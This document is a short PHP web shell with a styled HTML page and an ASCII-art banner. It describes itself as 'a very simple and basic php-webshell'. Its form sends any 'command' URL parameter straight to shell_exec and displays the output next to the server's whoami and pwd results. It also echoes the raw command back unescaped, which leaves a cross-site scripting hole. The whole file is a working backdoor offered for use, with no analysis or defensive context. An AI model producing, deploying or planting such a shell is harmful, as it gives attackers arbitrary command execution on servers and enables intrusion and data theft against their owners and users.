<html>
<head>
    <link href="https://fonts.googleapis.com/css?family=Cabin+Sketch|Orbitron|Press+Start+2P" rel="stylesheet">
    <style>
      html {
				font-family: 'Orbitron', sans-serif;
    		//font-family: 'Cabin Sketch', cursive;
    		//font-family: 'Press Start 2P', cursive;
        font-size: 24px;
				background-color:black;
				color: #9ACD32;
      }
			textarea {
				font-family: 'Orbitron', sans-serif;
    		//font-family: 'Cabin Sketch', cursive;
    		//font-family: 'Press Start 2P', cursive;
        font-size: 14px;
				background-color:black;
				color: #9ACD32;
			}
			pre {
				font-family: 'Press Start 2P', cursive;
				font-size: 10px;
			}
			input{
				border-width:0px;
				background-color:black;
				color: #9ACD32;
				font-family: 'Orbitron', sans-serif;
				font-size: 14px;
			}
    </style>
  </head>

<center>
<pre>
###############################################################################################
eeeee eeeee eeeee e   e eeeee e    e e    e   e   e  e eeee eeeee  eeeee e   e eeee e     e
   8 8   8 8   8 8   8 8  88 8    8 8    8   8   8  8 8    8   8  8   " 8   8 8    8     8
eeee8 8eee8 8eee8 8eee8 8   8 eeeeee eeeeee   8e  8  8 8eee 8eee8e 8eeee 8eee8 8eee 8e    8e
88    88  8 88    88  8 8   8 88   8 88   8   88  8  8 88   88   8    88 88  8 88   88    88
   88ee8 88  8 88    88  8 8eee8 88   8 88   8   88ee8ee8 88ee 88eee8 8ee88 88  8 88ee 88eee 88eee
###############################################################################################
</pre>
</center>
<center>
<p>
A very simple and basic php-webshell
</p>
<form id="webshell" action="">
	<label>> </label><input id="command" type="text" value="" name="command" autofocus/>
	<input id="button" type="submit" value="Submit"/>
</form>
</center>
</html
<?php
	$whoami=system('whoami',$noOut);
	$pwd=system('pwd',$noOut);
	echo '</pre></br><pre>';
	$command=shell_exec($_GET['command']);
	echo "<body><center><textarea readonly rows=25 cols=80>" . htmlspecialchars($whoami) . "[" . htmlspecialchars($pwd) . "]# " . $_GET['command'] . "\n" . htmlspecialchars($command) .  "</textarea></center></body>";
?>
